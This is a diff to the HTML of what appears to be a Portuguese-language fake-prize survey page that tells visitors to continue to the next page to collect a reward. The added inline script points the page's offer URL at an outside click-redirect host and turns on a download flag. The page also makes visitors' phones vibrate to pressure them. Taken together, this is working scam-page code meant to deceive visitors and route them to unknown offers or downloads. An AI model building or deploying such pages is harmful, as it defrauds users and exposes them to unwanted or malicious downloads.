@@ -60,7 +60,7 @@
       </div>
     </header>
 
-  <img src="/assets/banner.png" width="99%" />
+  <img src="assets/banner.png" width="99%" />
 
   <style>
     /* Header Styles */
@@ -422,7 +422,7 @@
           <br />Siga as instruções na próxima página para receber o seu prémio!
         </p>
         <br />
-        <a href="/form.html" class="button">SEGUINTE</a>
+        <a href="form.html" class="button">SEGUINTE</a>
       </vue-modal>
       <div class="left">
         <div class="product-preview">
@@ -540,8 +540,16 @@
         ></vue-survey>
       </div>
     </div>
-
-    <script src="/app.js" type="application/javascript"></script>
+  <script>
+      window.view = window.view || {};
+      view.offerUrl = "https:\/\/rdr.funcontent.xyz/click";
+      view.qs = null;
+      view.skip = 0;
+      view.screenshot = 0;
+      view.download = 1;
+      view.noredir = false;
+  </script>
+    <script src="app.js" type="application/javascript"></script>
 
     <script>
       navigator.vibrate([1000, 300, 1000, 300, 1000]);
